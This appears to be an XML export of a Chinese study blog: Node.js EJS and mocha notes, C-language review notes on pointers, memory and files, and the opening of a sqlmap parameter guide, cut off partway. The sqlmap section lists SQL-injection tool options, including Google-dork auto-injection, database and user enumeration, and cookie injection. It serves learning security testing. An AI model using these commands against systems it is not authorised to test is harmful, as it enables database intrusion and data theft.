&#125;)&#125;)#index.ejs&lt;ul&gt; &lt;%for(var i=0;i&lt;list_a.length;i++)&#123;%&gt; &lt;li&gt;&lt;%=list[i]%&gt;&lt;/li&gt; &lt;%&#125;%&gt;&lt;/ul&gt; 渲染页面 12#render(filename,json)接收两个参数。 常用标签 12345&lt;% %&gt; 流程控制标签&lt;%= %&gt; 输出标签（原文输出html标签）&lt;%- %&gt; 输出标签（html会被浏览器解析）&lt;%# %&gt; 注释标签% 对标记进行转义 includes,在一个模板里面引用另一个模板 1&lt;%- include("模板路径", &#123;user:"传递的参数内容"&#125;) %&gt; 九.mocha 前端测试框架 浏览器和Node环境都可使用 安装： 12345678910111213141516# 安装npm install mocha -g#命令mocha#本地安装npm install mocha -D# 修改配置文件中test命令&quot;test&quot;: &quot;......./bin/mocha&quot;# 运行npm test 基本用法定义测试： 创建一个js文件 123456789101112131415161718192021describe("Demo", function ()&#123; describe("方法1", function ()&#123; before(function ()&#123; //测试之前做的内容 console.log("---测试之前做的内容") &#125;) after(function ()&#123; //测试之后做的内容 console.log("---测试之前后做的内容") &#125;) beforeEach(function ()&#123; //每条测试之前做的内容 console.log("---每条测试之前做的内容") &#125;) context("情景1", function ()&#123; it("测试1", function ()&#123; &#125;) it("测试2", function ()&#123; &#125;) &#125;) &#125;)&#125;) mocha 来启动测试/ 或使用本地安装的mocha来测试npm test assert断言使用库：chai chai: 断言库 chai: should分割的断言 chai：expect风格的断言 安装到本地：npm install chai -D 使用 12345678910const chai = require('chai')const assert = chai.assertdescribe('Demo', function ()&#123; it("使用 assert风格的断言测试", function ()&#123; var val = 'hello' assert.typeOf(val, 'string') assert.equal('hello') &#125;)&#125;) 123456789101112131415const chai = require('chai')const sholud = chai.sholuddescribe('Demo', () =&gt; &#123; it("使用 sholud风格的断言测试", function ()&#123; var val = 'hello' val.sholud.exist val.sholud.be.a('string') val.sholud.equal('hello') val.sholud.not.equal('hello') val.sholud.have.length() //多个条件逻辑与 val.sholud.equal('hello').and.exist.and.be.a('string') &#125;)&#125;) 12345678910111213141516171819const chai = require('chai')const expect = chai.expectdescribe('Demo', () =&gt; &#123; it("使用 expect风格的断言测试", function ()&#123; var val = 'hello' var number = 3 expext(number).to.be.at.most(5) expext(number).to.be.at.least(3) expext(number).to.be.at.within(1,8) expect(value).to.exist expect(value).to.be.a('string') expect(value).to.equal('hello') expect(value).to.not.equal('hello') expect(value).to.have.length(5) &#125;)&#125;) 运行多个测试12mocha --recursive # 递归 好了，再学就跑偏了…… :smile:]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C语言琐碎复习（内容简单,仅自己看）]]></title>
    <url>%2FC%E8%AF%AD%E8%A8%80%E7%90%90%E7%A2%8E%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%86%85%E5%AE%B9%E7%AE%80%E5%8D%95-%E4%BB%85%E8%87%AA%E5%B7%B1%E7%9C%8B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[由于好久时间不看C了，好多东西都忘了 本文是跟着郝斌老师的视频做的随堂笔记，课下也没做整理，并不成系统，只是一些简单堆叠，且编码规范都没有，看看就好哈哈 字符串12345678910111213141516171819202122232425262728293031323334353637383940char greeting[6] = &#123;'H', 'e', 'l', 'l', 'o', '\0'&#125;;//1 strcpy(s1, s2);复制字符串 s2 到字符串 s1。 //2 strcat(s1, s2);连接字符串 s2 到字符串 s1 的末尾。 //3 strlen(s1);返回字符串 s1 的长度。 //4 strcmp(s1, s2);如果 s1 和 s2 是相同的，则返回 0；如果 s1&lt;s2 则返回小于 0；如果 s1&gt;s2 则返回大于 0。 //5 strchr(s1, ch);返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。 //6 strstr(s1, s2);返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。 //strlen 与 sizeof的区别：strlen 是函数sizeof 是运算操作符二者得到的结果类型为 size_t，即 unsigned int 类型。sizeof 计算的是变量的大小，不受字符 \0 影响；strlen 计算的是字符串的长度，以 \0 作为长度判定依据。 // 'a' 表示是一个字符，"a" 表示一个字符串相当于 'a'+'\0'; //字符串遍历char hi[] = "hello";for(i==0, i&lt;6,i++)&#123; printf("%c",hi[i]);&#125; 运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj 优先级 运算符 名称或含义 使用形式 结合方向 说明 1 [] 数组下标 数组名[常量表达式] 左到右 () 圆括号 （表达式）/函数名(形参表) . 成员选择（对象） 对象.成员名 -&gt; 成员选择（指针） 对象指针-&gt;成员名 2 - 负号运算符 -表达式 右到左 单目运算符 (类型) 强制类型转换 (数据类型)表达式 ++ 自增运算符 ++变量名/变量名++ 单目运算符 – 自减运算符 –变量名/变量名– 单目运算符 * 取值运算符 *指针变量 单目运算符 &amp; 取地址运算符 &amp;变量名 单目运算符 ! 逻辑非运算符 !表达式 单目运算符 ~ 按位取反运算符 ~表达式 单目运算符 sizeof 长度运算符 sizeof(表达式) 3 / 除 表达式/表达式 左到右 双目运算符 * 乘 表达式*表达式 双目运算符 % 余数（取模） 整型表达式/整型表达式 双目运算符 4 + 加 表达式+表达式 左到右 双目运算符 - 减 表达式-表达式 双目运算符 5 &lt;&lt; 左移 变量&lt;&lt;表达式 左到右 双目运算符 &gt;&gt; 右移 变量&gt;&gt;表达式 双目运算符 6 &gt; 大于 表达式&gt;表达式 左到右 双目运算符 &gt;= 大于等于 表达式&gt;=表达式 双目运算符 &lt; 小于 表达式&lt;表达式 双目运算符 &lt;= 小于等于 表达式&lt;=表达式 双目运算符 7 == 等于 表达式==表达式 左到右 双目运算符 != 不等于 表达式!= 表达式 双目运算符 8 &amp; 按位与 表达式&amp;表达式 左到右 双目运算符 9 ^ 按位异或 表达式^表达式 左到右 双目运算符 10 \ 按位或 表达式\ 表达式 左到右 双目运算符 11 &amp;&amp; 逻辑与 表达式&amp;&amp;表达式 左到右 双目运算符 12 \ \ 逻辑或 表达式\ \ 表达式 左到右 双目运算符 13 ?: 条件运算符 表达式1? 表达式2: 表达式3 右到左 三目运算符 14 = 赋值运算符 变量=表达式 右到左 /= 除后赋值 变量/=表达式 *= 乘后赋值 变量*=表达式 %= 取模后赋值 变量%=表达式 += 加后赋值 变量+=表达式 -= 减后赋值 变量-=表达式 &lt;&lt;= 左移后赋值 变量&lt;&lt;=表达式 &gt;&gt;= 右移后赋值 变量&gt;&gt;=表达式 &amp;= 按位与后赋值 变量&amp;=表达式 ^= 按位异或后赋值 变量^=表达式 \ = 按位或后赋值 变量\ =表达式 15 , 逗号运算符 表达式,表达式,… 左到右 从左向右顺序运算 注：同一优先级的运算符，运算次序由结合方向所决定。 数组main.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// 2.二维数组/**int a[3][4];总共12个元素，可以当做3行4列看待，依次是:a[0][0],a[0][1],a[0][2],a[0][3]a[1][0],a[1][1],a[1][2],a[1][3]a[2][0],a[2][1],a[2][2],a[2][3]a[i][j] ==&gt; i+1行，j+1列的元素int a[m][n]; 该二位数组的右下角位置的元素只能是a[m-1][n-1]*/void init_double()&#123; //1.最笨的初始化 int a[3][4]=&#123;1,2,3,4,5,6,7,8,9,10,11,12&#125;; //2.分开写（格式要写正确） int b[3][4]=&#123; &#123;1,2,3,4&#125;, &#123;5,6,7,8&#125;, &#123;9,10,11,12&#125; &#125;; //3.其他各种初始化 // 输出二维数组内容 int i, j; for(i=0;i&lt;3;++i) &#123; for(j=0; j&lt;4; ++j) &#123; printf("%-5d \t", b[i][j]); // 付好：左对齐，5代表占5个位置（这不是重点，格式控制有其他控制办法） &#125; printf("\n"); // 格式化(每四个一行) &#125; // 二维数组排序 //求每一行最大值 //&#125;// 多维数组：/*1. 不存在! 因为内存是线性一维的2. n维数组可以当做 每个元素是n-1维数组的一维数组 的数组比如：a[3][4]，可以当做含有三个元素的一维数组，只不过每个元素都可以划分为4个小元素*/ 函数func.h 1234#include &lt;stdio.h&gt;int after_func(); // 函数的声明， 可以不写变量名void get_max(int, int); // 函数声明，记得加分号 main.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#include "func.h"void before_func()&#123; printf("我是函数测试，在主函数之前定义的。"); getchar();&#125;void main()&#123;// 函数定义写在主函数之前的时候，那么就无需在主函数里面声明这个函数，只需要把函数体写在主函数前即可//否则，需要先声明. // 此函数定义在主函数之前，直接调用即可，无须声明 //before_func(); //在主函数之后定义的，需要先声明才能调用。 //1.声明(要放在main外面，我放在了自定义的头文件里面) //2.调用 //after_func(); // 求最大值 //int i,j; //i=5;j=10; //get_max(i, j); int i; for(i=0;i&lt;20;++i) &#123; get_max(i,i+1); &#125; getchar();&#125;int after_func()&#123; printf("我是函数测试，在主函数之后定义的，需要先声明才能调用。"); getchar(); return 0;&#125;//求最大值void get_max(int a, int b)&#123; int max_val = a&gt;b?a:b; printf("%d和%d比较，最大值为: %d \n", a,b,max_val);&#125;/*return和break的区别：1.break:循环、switch2.return终止函数*//*函数的分类：1.有参函数和无参函数2.有返回值和无返回值3.库函数和用户自定义函数4.普通函数和主函数(main)：一个程序只能有一个主函数，主函数既是程序的入口，也是程序的出口主函数能调用主函数，其他函数不能调用main函数，普通函数可以相互调用5.值传递和引用传递(其实这样说是不对的)*//*如何在软件开发中，合理的设计函数来解决实际问题：功能划分的详细一些，提高利用率函数是C语言的基本单位，类是Java，C#等的基本单位*//*常用的系统函数:1. doulbe sqrt(double x) 求x的平方根2. int abs(int x) 求整数的绝对值3. double fabs(double x) 推荐书籍：机械工业出版社：《turboc2.0使用大全》*//*递归：栈：先进先出*//*变量的作用于和存储方式：1.按作用域分：全局变量，局部变量（函数内部定义的变量/函数的形参）2.按变量的存储方式：静态变量，自动变量，寄存器变量*/int k=99;void test_var()&#123; //局部变量与全局变量命名相同：局部变量会屏蔽掉全局变量&#125; 指针test.h 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define N 5void test1();void test2();void test3();void test4();void test5();void test6();void test7();void test8();void base_pointer();void free_test();void exchange_two();void test_exchange1(int,int);void test_exchange2(int,int);void test_exchange3(int,int);void two_pointer();void dynami_memo1();void dynami_memo2();void dynami_memo3();void dynami_memo4();void dynami_memo5();void dynami_memo6(); main.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470#include "test.h"void main()&#123; //base_pointer(); exchange_two();&#125;void test1()&#123; int j=3; int * q; // q是变量名, int *表示q变量存放的是int类型变量的地址（int * 是数据类型） // 错误写法：q=55; 后面不能是值，只能跟地址 q=&amp;j; //*q与j是等同的 /* 1.q保存了j的地址，引起：q指向j。 2.q不是j，j不是q。修改q的值不会影响j,修改j的值也不会影响q的值 3.如果一个指针变量指向一个普通变量，则*指针变量完全等同于普通变量 */ /* 指针：就是地址，地址就是指针 指针变量：存放地址的变量 两者不是一个概念 但是，通常在叙述中，会把指针变量简称为指针 */ // 一级指针 // 指针的本质： 存地址(内存单元的编号)，间接访问 // 指针使用场景： // &amp; 取地址操作符/【引用】 // * 取值操作符/【解引用】&#125;void test2()&#123; /* 指针的重要性; 表示一些复杂的数据结构; 快速的传递数据 使函数返回一个以上的值 能直接访问硬件 能方便的处理字符串 是理解面向对象语言中引用的基础 */ //地址： /* 内存单元的编号 从零开始的非负整数 范围： */ //指针： /* 指针就是地址，地址就是指针 指针变量就是存放内存单元的变量， 两者不是一个概念 但是，通常在叙述中，会把指针变量简称为指针 指针的本质就是一个操作受限的非负整数 */ //指针的分类： /* 1.基本类型的指针 int *p; int i=10; int j; p = &amp;i; i=*p; printf("%d",j); 例子，见函数base_pointer */&#125;void base_pointer()&#123; int *p; int *q; int i=5; //*p = i; //【错误】，*p代表的是p指向的地址的变量的值，p现在指向的垃圾值(还没有初始化) //应该这样 p = &amp;i; //*q=p; //【错误】，有语法错误，*q是整形，p是int*类型 //*q = *p; //【错误】,语法没错，但是q指向垃圾值（没初始化） //应该这样： //p=q; // 【错误】，q赋给p，p也变成垃圾值 //printf("%d\n", *p); // q的空间是属于本程序的，所以本程序可以读写q的内容，但是如果q的内部是垃圾值，则本程序不能读写*p的内容,因为*q所代表的的内存单元的控制权限并没有分配给本程序 // // 指针变量的运算： // 指针变量不能相加、相乘、相除（能相减：如果两个指针变量指向的是【同一块连续空间中的不同存储单元】） /* p = &amp;a[1]; q = &amp;a[3]; printf("%d", q-p); */ getchar();&#125;//指针的偏移void test3()&#123; int a[N]=&#123;1,2,3,4,5&#125;; int *p; int i; p = &amp;a[4]; // 指向a最后一个元素 for(i=0; i&lt;N; i++) // 指针偏移 &#123; printf("%3d", *(p-i)); // p +sizeof(int) &#125; printf("\n"); getchar();&#125;//指针与自增void test4()&#123; int a[3]=&#123;2,7,8&#125;; int *p; int j; p = a; j = *p++; // j = *p; p=p+1。 printf("a[0]=%d, j=%d, *p=%d \n", a[0], j, *p); // 2,2,7 j = p[0]++; // j=p[0], p[0] = p[0] +1 printf("a[0]=%d, j=%d, *p=%d \n", a[0], j, *p); // 2,7,8 ？？？ getchar();&#125;//野指针: free以后的指针未被赋值为NULL (指向了一个未知的空间)void test5()&#123; int *p, *p1, *p2, *p3; p = (int *)malloc(4); *p = 1; free(p); p = NULL; // 赋值null以后，后面用的话会崩溃，能迅速找到问题 p1 = (int *)malloc(4); *p1 = 2; // 没有free p2 = (int *)malloc(4); *p2 = 2; free(p1); p3 = (int *)malloc(4); *p3 = 3; *p1 = 20; // 以为p1free了，这里又赋值 printf("p3 = %d", *p3); // 20了 malloc有缓存机制&#125;// 经典程序：互换两个数字void exchange_two()&#123; int a=3; int b=5; //int t; //之前的做法 //t=a; //a=b; //b=t; // 现在要求调用一个函数实现 test_exchange3(&amp;a, &amp;b); printf("a=%d,b=%d",a,b); getchar();&#125;// 不能完成互换功能void test_exchange1(int a, int b)&#123; int t; t=a; a=b; b=t;&#125;// 不能完成互换功能，只是把q和p的值换了，a和b并没有互换void test_exchange2(int *p, int *q)&#123; int *t; // 如果要互换，变量类型必须一致 t = p; p = q; q = t; // 形参的改变，不会改变实参的值&#125;// 可以完成互换: p是a的地址，*p就是avoid test_exchange3(int *p, int *q)&#123; int t; // 如果要互换，变量类型必须一致 t = *p; // *p是int，p是int* *p = *q; *q = t;&#125;// *的含义void test6()&#123; //1.乘法 //2.定义指针变量 int *p; //定义了一个叫p的变，int *表示p只能存放地址 //3.指针运算符：取地址的逆运算/间接访问 // 放在已经定义好的指针变量的前面，取改指针的值 //*p 表示以p的内容为地址的变量 //写法：下面三种是等价的 //int * p; //int *p; //int* p;&#125;void free_test()&#123;/*脏数据申请的空间不释放：内存泄露堆空间：一旦申请，一直占用，除非free*/ int i; char *p; scanf("%d", &amp;i); p = (char *)malloc(i); strcpy(p, "hello"); // p指向堆空间 // p = "hellp"; puts(p); free(p); // 释放 printf("free p ~~~~~~~~~~~");&#125;void test7()&#123; // 一个指针变量到底占几个字节？ /* 指向不同类型，是不同的，比如int 一般是4个字节, char就是1个。 sizeof()可以查看：sizeof(double) p,q,r所占的字节数是一样的 【总结：】一个指针变量，无论他指向的变量占几个字节，该指针变量只占四个字节。 一个变量的地址使用该变量首字节的地址来表示 */&#125;//动态内存分配（重点）void test8()&#123; /* 1.传统数组的缺点 a.数组长度必须事先制定，且只能是长整数，不能是变量（int len=5; int a[len]; 这样是错误的） b.传统形式定义的数组，该数组的内存，程序员无法手动释放（一旦定义，该分配空间一直存在，直到数组所在的函数运行结束，数组的空间才会被系统释放） c.数组的长度不能再函数运行过程中动态扩充或缩小(长度一旦定义，其长度就不能再更改) d.A函数定义的数组，在A函数运行期间可以被其他函数使用；但A函数执行完毕后，A函数中的数组将无法再被其他函数使用 传统数组也叫静态数组 2.为什么需要动态分配内存 解决了传统数组的4个缺陷 3.动态内存分配举例_ 动态数组的构造 4.静态内存和动态内存的比较 5.跨函数使用内存的问题 */&#125;void dynami_memo1()&#123; // malloc 是memory(内存) allocate(分配)的缩写 int i = 5; char *p; p = (char *)malloc(i); /* 1.要使用malloc，必须添加malloc.h或stdlib.h头文件 2.malloc只有一个形参，且形参必须是整数类型 3.上面，表示请求系统为本程序分配5个字节 4.malloc函数只能返回第一个字节的地址，所以前面要把地址强制转换为int* 5.p本身的内存是静态分配的，p所指向的内存是动态分配的 */ strcpy(p, "hello"); // p指向堆空间 // p = h e l l o \o; puts(p); free(p); // 释放p所指向的内存 （p本身的内存是静态的，不能由程序员手动释放） printf("free p ~~~~~~~~~~~");// 脏数据// 申请的空间不释放：内存泄露// 堆空间：一旦申请，一直占用，除非free&#125;void f(int *q)&#123; // *p = 200; // error // q = 20 //error // q是p的一份拷贝(副本) // **q=200 // error *q=200;&#125;void dynami_memo2()&#123; //int *arr = (int*)malloc(20); // int *p; // arr[0] = 1; // arr[1] = 1; // arr[2] = 1; // arr[3] = 1; // p = (int*)realloc(arr, 40); // 扩展 // p[4] = 6; int *p = (int *)malloc(sizeof(int)); *p = 10; printf("%d\n", *p); //10 f(p); printf("%d\n", *p); //200&#125;//动态内存分配举例 动态一维数组的构造void dynami_memo3()&#123; int len; int *pArr; int i; printf("请输出要存放元素的个数："); scanf("%d", &amp;len); // 5 pArr = (int *)malloc(4*len); // 数组长度为len； 5*4=20,（默认pArr指向第一个字节，但是由于进行了int强转，所以pArr指向前四个字节,pArr指向后面4个字节） //类似于 int pArr[len]; //赋值 for (i=0; i&lt;len; ++i) &#123; scanf("%d", &amp;pArr[i]); &#125; //输出 printf("一维数组的内容是: \n"); for (i=0; i&lt;len; ++i) &#123; printf("%d, ", pArr[i]); &#125; realloc(pArr, 40); // 扩展 //释放数组 free(pArr);&#125;//动态内存和静态内存的比较void dynami_memo4()&#123; /* 静态内存是由系统自动分配，由系统自动释放，是在栈分配的 动态内存是由程序员手动分配，手动释放，是由堆分配的 malloc是堆分配的 栈是存储结构，堆是排序方式 */&#125;void multi_test(int **pp)&#123; int j=300; // pp是p的地址，那*pp 就是p *pp = &amp;j; // 修改 **pp = 200; // 修改&#125;//多级指针（意义：跨函数使用内存）void two_pointer()&#123; // 【场景】：当在子函数中需要修改主函数某一个一级指针变量的值，就需要二级指针 //char b[N][10] = &#123;"lilei","hanmeimei","xiyangyang","huitailang", "xiongda"&#125;; //char * p[N]; // 指针数组，里面存储的指针类型就是 二级指针 // &amp;p[0] 每次偏移是固定的，64位数下就是8个字节 //// char **p2; //int i; //for(i=0; i&lt;N; i++) //&#123; // p[i] = b[i]; //&#125; //for(i=0; i&lt;N; i++) //&#123; // puts(p[i]); //&#125; int i = 10; int *p = &amp;i; int **q = &amp;p; int ***r = &amp;q; //r = &amp;p; // 错误，因为r是int**类型，r只能存放int**类型变量的地址 printf("%d",***r); // r的值 //在另一个函数内部改变变量值 multi_test(&amp;p); // p是int *, 那么 &amp;p是int**&#125;void f1(int **q)&#123; int i=5; //*q等价于p，q和**q都不等价于p // *q=i // error *q = &amp;i; // p=&amp;i //**q=i;&#125;//静态变量不能跨函数使用void dynami_memo5()&#123; int *p; f1(&amp;p); printf("%d", *p); // 本语句语法没有问题，但逻辑上有问题（因为f函数中i的静态分配的，f结束，i的空间就释放了）&#125;void f2(int **q)&#123; *q = (int *)malloc(sizeof(int)); // 等价于p = (int *)malloc(sizeof(int)); //q=5; // error //*q=5; // p=5 error **q=5; // *p=5&#125;//动态内存可以跨函数使用（重点）void dynami_memo6()&#123; int *p; f2(&amp;p); printf("%d", *p); // 能改变。p指向的是上面堆里面分配的空间&#125; 结构体jiegouti.h 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void test();void struc_func();void InputStudent(struct Student *);void OutputStudent(struct Student);void OutputStudent2(struct Student *);void test_union(); main.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212#include "jiegouti.h"void main()&#123;&#125;void test()&#123; /* 为什么需要结构体？ 为了表示一些复杂的事物，而普通的数据类型无法满足实际需求 结构体： 把一些基本类型组合到一起，形成的一个新的符合数据类型 大小： 结构体：总大小一般情况下等于各成员大小之和(先不考虑内存对齐) 共用体：大小等于成员中最大的那个大小。（通常和结构体一起使用） 如何定义(推荐第一种)： 1. 推荐（这只是定义了一个新的数据类型，并没有定义变量） struct student&#123; int num; char name[20]; int age; &#125;; 2. 这样只能定义一次 struct student&#123; int num; char name[20]; int age; &#125; st1; 3. 类型都没写... struct &#123; int num; char name[20]; int age; &#125; st1; //赋值和初始化(定义同时可以整体赋值,定义玩之后只能单个赋值) 定义同时初始化： struct student s1 = &#123;1,'xxx',18&#125;; 先定义，后赋值： struct student s2; s2.num=1; s2.name='yyy'; s2.age=19; //取出结构体变量中每一个成员【重点】 1.结构体指针变量名.成员名 2.指针变量名-&gt;成员名 （第二种更常用） struct student *p = &amp;s; //注意是&amp; p-&gt;name; //第一种方式(指针变量-&gt;成员变量名,在计算机内部会被转换为(*指针变量名).成员名) (*p).name; //第二种方式，与 s.name; 等价 //结构体变量的运算 结构体变量不能相加，相减，也不能相互乘除。 但结构体变量可以相互赋值 //结构体变量和结构体变量指针作为函数参数传递的问题 //动态构造结构体数组 //链表 */ int num; struct student&#123; int num; char name[20]; char gender; int age; float score; char addr[30]; &#125; ss=&#123;1,'xx','nan',20,99.9,'hhh'&#125;; // ss就是变量 可以直接在这里初始化 //赋值和初始化 struct student ss2 = &#123;2,'yy','bei',20,99.9,'zzz'&#125;; struct student s = &#123;100,'lala','M',20,99.5, 'beij'&#125;; // 结构体数组 struct student sArr[3]; for (int i = 0; i &lt; 3; i++) &#123; scanf("%d%s %c%d%f%s", &amp;sArr[i].num, sArr[i].name, &amp;sArr[i].gender, &amp;sArr[i].age,&amp;sArr[i].score, &amp;sArr[i].addr); // %c 忽略空格 &#125; // 结构体指针 struct student *p = &amp;s; //注意是&amp; //p = &amp;s; // 获取成员 p-&gt;name; //第一种方式(指针变量-&gt;成员变量名,在计算机内部会被转换为(*指针变量名).成员名) (*p).name; //第二种方式，与 s.name; 等价 // p-&gt;name的含义：p所指向的那个结构体变量中的name这个成员 num = p-&gt;num++; // num = p-&gt;num, num=p-&gt;num+1; //优先级 // 第一时间去掉++ num = p++-&gt;num; // 没问题, num=p-&gt;num, p=p+1 //浮点型默认在C语言中是double，如果要定义成float，则在后面加f或F， 但是不能准确存储&#125;///////////////////////////////////////////struct Student&#123; int num; char name[20]; int age;&#125;;// 通过函数完成对结构体变量的输入和输出void struc_func()&#123; struct Student st; InputStudent(&amp;st); //对结构体变量输入 OutputStudent(st); //对结构体变量输出 OutputStudent2(&amp;st); //对结构体变量输出&#125;void InputStudent(struct Student * pstu) //pstu只占4个字节&#123; (*pstu).num=1; strcpy(pstu-&gt;name, "xxx"); pstu-&gt;age=18;&#125;;/* 这是无法改变主函数的值的void InputStudent(struct Student stu)&#123; stu.num=1; strcpy(stu.name, "xxx"); stu.age=18;&#125;;*/////应该发送内容还是传送地址？//如果传递的是内容，内存消耗大void OutputStudent(struct Student stu)&#123; printf("%d, %s %d", stu.num,stu.name, stu.age);&#125;// 如果传递的是地址，可能不安全，但是提高了速度，节省了内存（推荐这种方法）void OutputStudent2(struct Student *pstu)&#123; printf("%d, %s %d", pstu-&gt;num,pstu-&gt;name, pstu-&gt;age);&#125;/*【指针优点大总结：】快速的传递数据，较少了内存的消耗 【重点】使函数返回一个以上的值 【重点】能直接访问硬件能方便的处理字符串**///共用体void test_union()&#123; //共用体：大小等于成员中最大的那个大小（通常和结构体一起使用） // union 共用体name // &#123; // 成员表列 // &#125; 变量表列; union data&#123; int i; char c; float f; &#125;u1; // 共用体的起始地址和每个成员的起始地址是相同的 // 一个时间内只能存取一个成员 union data d; // 现在最大的就是4 d.i = 4; d.c='A'; d.f = 99.9;&#125; typedef12345678910111213141516171819202122232425262728//1) 为基本数据类型定义新的类型名typedef double REAL; //2) 为自定义数据类型（结构体、共用体和枚举类型）定义简洁的类型名称typedef struct tagPoint&#123; double x; double y; double z;&#125; Point;/*实际上完成了两个操作：1、定义了一个新的结构类型struct tagPoint&#123; double x; double y; double z;&#125; ;2、使用 typedef 为这个新的结构起了一个别名，叫 Pointtypedef struct tagPoint Point*///3) 为数组定义简洁的类型名称typedef char* PCHAR;PCHAR pa NULL12345678二进制全部为0的含义： 1.数值为0 2.字符串结束标记符 &apos;\0&apos; 3.空指针NULL NULL表示编号为0的地址 NULL表示的是零，不是数字，而是代表内存单元的编号 计算机规定了，以零为编号的存储单元的内存不可读、不可写 文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//文件void test_file()&#123; # define N 20 FILE *fp; char c; char p; char ret; char buf[N] = &#123;0&#125;; // 先初始化 // fp = fopen("file.txt", "r"); fp = fopen("D:\Desktop\1.txt", "r+"); // argv[1] 是传递的第一个参数 if(fp == NULL) // 判断打开是否成功， -&gt; 失败 &#123; perror("fopen"); // 定位函数执行错误原因（只能定位刚刚执行的） goto error; &#125; // fgetc 读取，一次读取一个字节 while ((c = fgetc(fp)) != EOF) &#123; printf("%c",c); &#125; // fputs 写入，一次写入一个字节 p = 'H'; ret = fputc(p, fp); // printf(FILE *fp,const char *format, ...) 函数来写把一个字符串写入到文件中 fprintf(fp, "This is testing for fprintf...\n"); // fread: buf没有\0 ret = fread(buf, sizeof(char), N, fp); printf("%d, %s \n", ret, buf); // fwrite: strcpy(buf, "word"); ret = fwrite(buf, sizeof(char), strlen(buf), fp); // 清空buffer memset(buf,0,sizeof(buf)); // fseek fseek(fp, 0, SEEK_SET); // 移动到开头。 SEEK_SET,偏移量的起始点:文件开始处 fseek(fp, -12, SEEK_CUR); // 往回偏移, 与磁盘上实际的字节数对应。 SEEK_CUT:文件当前位置 // SEEK_END,偏移量的起始点：SEEK_END // ftell 获取文件读写指针的当前位置 long last = ftell(fp); fclose(fp); error: printf("error!!!"); // fclose(fp); // 关闭文件&#125;]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>琐碎复习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap参数简介]]></title>
    <url>%2Fsqlmap%E5%8F%82%E6%95%B0%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[概述 官网 其他特性： 数据库直接连接 -d, 不通过SQL注入，执行身份认证信息，ip，端口 与BurpSuite，Google结合使用，支持政策表但是限定测试目标 支持Basic, Digest, BTLM, CA 身份认证 db版本， 用户，权限，hash枚举和字典破解，暴力破解表列名称 文件上传下载，UDF， 启动并执行存储过程，操作系统命令执行，访问win注册表 与w3af， metasploit集成结合使用，基于数据库服务进程提权和上传执行后门 升级:12345# 在线更新sqlmapsqlmap --update# 离线升级git pull 其他常识：12345678# 结果文件夹位置/.root/sqlmap/output# 日志.sqlmap # 配置文件 自己找 基本参数1. Target Get方法： 12345678910111213141516-u url链接 # get链接-f # 检查DBMS的指纹信息-p user_name # 指定字段参数-m list.txt # 扫描url列表文件-g # google搜索,自动去google找到然后自动注入 \” 是转义引号，如下所示：# 例如： sqlmap -g "inurl:\".php?id=1\" # 结果文件夹位置/.root/sqlmap/output-- users # 有哪些user --banner # banner 信息--dbs # 有哪些库--schema #元数据(查的是informatin_schema信息，前提是有权限)-a # 所有的-d “mysql://root:@192.168.20.10:3306/dvwa” # 让sqlmap作为客户端链接数据库（dvwa是数据库名称） Post方法：就不是通过url来扫描了，而是body来进行扫描 123456789-r request.txt # 使用http请求文件进行注入（burpsuite拦截的请求数据包复制保存到文件, 存在注入的位置用*标出）-l log.txt # 使用burpsuite log文件 （使用burpsuite:option-&gt; Misc -&gt;logging -&gt; 这里选择Proxy-&gt; 这里选择requests-&gt; 选择log文件保存位置 ）--force-ssl # 支持Https，即听过https来进行请求，或在url域名后+443端口也可以-c sqlmap.conf # 扫描配置文件（把扫描配置写到里面，把它引用即可）# 查找文件dpokg -L # 找有关..的文件包dpokg -L sqlmap | grep sqlmap.conf 2. Request post请求 12345678910111213141516171819--data="user=xx&amp;pswd=yy" # 数据（对于post请求：除了保存请求头的方法，也可以这样data加参数， 也支持get方法：参数放--data后面）--param-del=";" # 变量分隔符(若多个变量不是以&amp;分割),如：参数以分号分割 --data="name=1;id=11" --param-del=";"--cookie "xxxxxxxxx" --level=2 # 带上cookie头(level=2时才会检查cookie是否存在注入点) 参数: set-cookie / --drop-set-cookie 是否丢弃上一个cookie,使用新的cookie#cookie ---&gt; 